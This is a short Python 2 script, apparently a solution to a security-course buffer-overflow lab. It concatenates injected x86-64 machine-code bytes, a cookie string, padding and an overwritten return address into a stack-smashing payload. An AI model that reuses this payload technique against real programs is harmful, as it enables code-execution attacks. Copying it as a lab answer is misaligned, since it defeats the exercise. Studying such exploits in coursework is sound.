set_zero_rdi_p8="\x48\xc7\x47\x08\x00\x00\x00\x00"
pop_rdi ="\x8f\x07"
cookie_str = "\x32\x64\x32\x37\x34\x33\x37\x38\x00"
mov_addr_rsp_cookie="\x48\xc7\xc4\xb7\xe5\x67\x55"
mov_addr_rsp="\x48\xc7\x04\x24\xb6\x18\x40\x00"
ret="\xc3"

padding = "a"*(40-len(mov_addr_rsp_cookie)-len(pop_rdi)-len(mov_addr_rsp) - len(ret)-len(cookie_str)-len(set_zero_rdi_p8))
rip ="\x98\xe5\x67\x55\x00\x00\x00\x00"
print  mov_addr_rsp_cookie + set_zero_rdi_p8+pop_rdi + mov_addr_rsp + ret + padding + cookie_str + rip 